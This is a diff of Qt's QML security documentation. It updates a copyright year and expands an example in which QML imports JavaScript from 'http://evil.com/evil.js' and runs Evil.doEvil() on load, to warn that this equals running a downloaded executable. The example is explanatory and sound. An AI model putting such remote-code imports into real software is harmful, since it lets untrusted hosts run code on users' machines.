@@ -1,6 +1,6 @@
 /****************************************************************************
 **
-** Copyright (C) 2010 Nokia Corporation and/or its subsidiary(-ies).
+** Copyright (C) 2011 Nokia Corporation and/or its subsidiary(-ies).
 ** All rights reserved.
 ** Contact: Nokia Corporation (qt-info@nokia.com)
 **
@@ -41,8 +41,12 @@ arbitrary downloaded JavaScript, nor instantiate arbitrary downloaded QML elemen
 For example, this QML content:
 
 \qml
+import QtQuick 1.0
 import "http://evil.com/evil.js" as Evil
-... Evil.doEvil() ...
+
+Component {
+    onLoaded: Evil.doEvil()
+}
 \endqml
 
 is equivalent to downloading "http://evil.com/evil.exe" and running it. The JavaScript execution
